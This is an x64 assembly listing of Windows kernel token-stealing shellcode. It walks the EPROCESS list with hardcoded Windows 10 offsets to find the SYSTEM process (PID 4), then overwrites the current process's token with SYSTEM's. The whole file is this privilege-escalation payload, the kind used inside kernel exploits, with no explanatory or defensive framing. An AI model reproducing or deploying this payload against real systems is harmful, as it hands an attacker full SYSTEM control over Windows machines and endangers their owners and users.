[bits 64      ]
[section .text]

global _start

_start:
	xor rax,rax
	mov rax, qword gs:[0x188] ; Obtain the current thread ( nt!_KPCR.PcrbData.CurrentThread )
	mov rax, [rax + 0xb8]     ; Obtain the current process ( nt!_KTHREAD.ApcState.Process )
	mov rcx, rax              ; Copy the current process _KPROCESS into rcx
	mov rdx, 0x04             ; WIN 10 SYSTEM PROCESS PID

	SearchSystemPID:
		mov rax, [rax + 0x448] ; ( nt!_EPROCESS.ActiveProcessLinks.Flink )
		sub rax, 0x448
		cmp [rax + 0x440], rdx ; ( nt!_EPROCESS.UniqueProcessId )
		jne SearchSystemPID

	mov rdx, [rax + 0x4b8] ; Get SYSTEM process ( nt!_EPROCESS.Token )
	mov [rcx + 0x4b8], rdx ; Replace target process token ( nt!_EPROCESS.Token )
